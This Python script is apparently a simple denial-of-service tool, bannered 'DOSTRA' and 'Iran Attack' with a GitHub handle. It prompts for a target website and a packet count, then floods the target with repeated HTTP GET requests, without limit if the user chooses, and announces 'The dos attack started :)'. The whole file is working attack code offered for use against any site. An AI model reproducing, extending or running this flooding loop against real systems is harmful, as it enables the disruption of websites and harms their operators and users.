from ast import Pass
from time import sleep
from requests import get as requests_get
from time import localtime,strftime

def main():

    print("\n██████╗░░█████╗░░██████╗████████╗██████╗░░█████╗░")
    print("██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗")
    print("██║░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝███████║")
    print("██║░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██╔══██║")
    print("██████╔╝╚█████╔╝██████╔╝░░░██║░░░██║░░██║██║░░██║")
    print("╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝")
    print("-------------------------------------------------")
    print("   ----| Iran Attack _ GitHub:@emnatkins |----   ")
    print("-------------------------------------------------\n\n")
main()

def dos():
        print("=======================================\n|")
        s = input("-- target: ")

        c = input("-- Do you want continue (y/n): ")
        if c == 'y':
            packet = input("-- Packet Size (\"u\" = unlimited): ")
            print("|\n=======================================\n\n")
            count = 0
            
            if s[0:7] == "http://":
                s = s[7:len(s)]
            elif s[0:8] == "https://":
                s = s[8:len(s)]

            is_connected = False
            try:
                requests_get("http://"+s)
                is_connected = True
            except:
                pass
            if is_connected:
                if packet == "u":
                    print("===== The dos attack started :)")
                    while True:
                        named_tuple = localtime() # get struct_time
                        time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
                        r = requests_get("http://"+s)
                        print(f"[{time_string}] Pocket was sent ({count})")
                        count+=1
                elif int(packet)>=1:
                    print("===== The dos attack started :)")
                    while count <= int(packet):
                        named_tuple = localtime() # get struct_time
                        time_string = strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
                        r = requests_get("http://"+s)
                        print(f"[{time_string}] Pocket was sent ({count})")
                        count+=1
                    else:
                        print("it is finished!")
                        exit_input = input("Do you want to stay in the tool? (y/n): ")
                        
                        if exit_input == "n":
                            sleep(9999999999999)
                        
                        print("Note: The program closes automatically after 5 seconds!")
                        sleep(5)
                else:
                    print("Error : Please enter the correct number of packets :(")
                    print("Note: The program closes automatically after 5 seconds!")
                    sleep(5)
            else:
                print("Error : Please enter a valid site address :/")
                print("Note: The program closes automatically after 5 seconds!")
                sleep(5)
        elif c == 'n':
            print("bye! :)\nNote: The program closes automatically after 5 seconds!")
            sleep(5)

        else:
            print("Error : Please use the correct character :(")
            print("Note: The program closes automatically after 5 seconds!")
            sleep(5)
dos()
